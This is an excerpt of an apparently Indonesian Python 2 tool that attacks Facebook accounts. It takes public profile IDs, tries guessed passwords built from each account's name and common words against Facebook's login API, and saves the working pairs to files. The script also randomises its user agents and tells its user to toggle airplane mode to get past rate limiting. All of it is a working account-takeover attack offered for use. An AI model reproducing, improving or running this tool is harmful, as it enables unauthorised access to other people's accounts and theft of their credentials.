...
uas = random.choice(["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36",
...
\x1b[1;92m          ____ _               _     _  _    ___  _  _   
\x1b[1;92m         / ___| |__   ___  ___| |_  | || |  / _ \| || |  
\x1b[1;92m        | |  _| '_ \ / _ \/ __| __| | || |_| | | | || |_ 
\x1b[1;92m        | |_| | | | | (_) \__ \ |_  |__   _| |_| |__   _|
\x1b[1;92m         \____|_| |_|\___/|___/\__|    |_|  \___/   |_|  
...
def tokenz():
	...
	try:
		...
		logo()
		print""+p+""
		print" \x1b[1;92m LOGIN PAKE TOKEN "
		print" \x1b[1;92m KALO GAK ADA TOKEN GAK USAH CRACK BEGO "
...
def menu():
    ...
    logo()
    print(" "+p+"[*] Author     : Yusuv 404.") 
    print(" [*] Github     : Gak Ada Github Gw Njir")
    print(" [*] ---------------------------------------------")
    print(" [*] ID         : "+id)
    print(" [*] IP         : "+ip)
    print"\n [ selamat datang \033[1;93m"+nama+"\033[1;97m ]"
    print("")
    print("\x1b[1;93m [1].\x1b[1;92m crack dari id publik \x1b[1;97m")
    print("\x1b[1;93m [2].\x1b[1;92m lihat hasil crack \x1b[1;97m")
    print("\x1b[1;93m [0].\x1b[1;92m keluar (hapus token) \x1b[1;97m")
    asw = raw_input("\n [?] pilih : ")
    if asw == "":
    	menu()
    elif asw == "1":
...
def pilihmetode(file):
	...
	print("")
	print("\x1b[1;93m [1].\x1b[1;92m metode api (fast) \x1b[1;97m")
	print("\x1b[1;93m [2].\x1b[1;92m metode free.fb (slaw) \x1b[1;97m")
	print("")
	z = raw_input(" [?] metode : ")
	if z == "":
		print(" [!] pilih yang benar sayank !!")
...
def bapi():
	...
	print("\n [!] jika tidak ada hasil, aktifkan mode pesawat 1-5 detik")
	print("")
	...
	def main(arg):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123', '123456', 'name.lower', 'anjing', 'bagong', '123456', 'kontol', 'sayang', 'bismillah', 'namefull' ]:
				...
				if "session_key" in respon.text and "EAAA" in respon.text:
					print '\r\033[0;92m %s [OK] facebook.com/' +uid+ ' | ' + pw + '        '
					ok.append(uid+'|'+pw)
				...
				if "www.facebook.com" in respon.json()["error_msg"]:
					try:
						...
						month = bulan[month]
						print'\r\x1b[1;93m  [CP] facebook.com/' + uid + ' | ' + pw + '|' + day + ' ' + month + ' ' + year + ' '
					...
					print'\r\x1b[1;93m  [CP] facebook.com/' + uid + ' | ' + pw + '                        '
					cp.append(uid + '|' + pw)
					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					save.write('  ---> ' + str(uid) + ' | ' + str(pw) +                        '\n')
					save.close()
	...
	print'\n\n\x1b[1;97m [+] jangan lupa copy kalo ada hasil'
	exit()


def manualbapi():
    print'\n [+] buat password contoh : bismillah,sayang,rahasia'
    print'\n [+] jangan pake spasi ,langsung pake koma aja (,)'
    pw = raw_input(' [?] buat password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar Sayank, Tidak Boleh Kosong!')
    print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    ...
    def main(arg):
        ...
        try:
            for asu in pw:
                ...
                respon = requests.get(api,params=param, headers=kontol)
                if "session_key" in respon.text and "EAAA" in respon.text:
                    print'\r\x1b[0;92m [OK] facebook.com/' + uid + '|' + asu + '        '
                    ok.append(uid + '|' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [OK] facebook.com/' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if "www.facebook.com" in respon.json()["error_msg"]:
                    print'\r\x1b[1;93m  [CP] facebook.com/' + uid + '|' + asu + '        '
                    cp.append(uid + '|' + asu)
                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                    save.write('  [CP] facebook.com/' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
    ...
    p.map(main, id)
    print'\n\n\x1b[1;97m [+] Crack Selesai...'
    print'\n [+] Jangan Lupa Salin Kalo Ada Hasil'
    exit()
...
def freefb():
    ...
    def main(arg):
        ...
        try:
            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123', '123456', 'anjing', 'bagong', '123456', 'kontol', 'sayang', 'bismillah' ]:
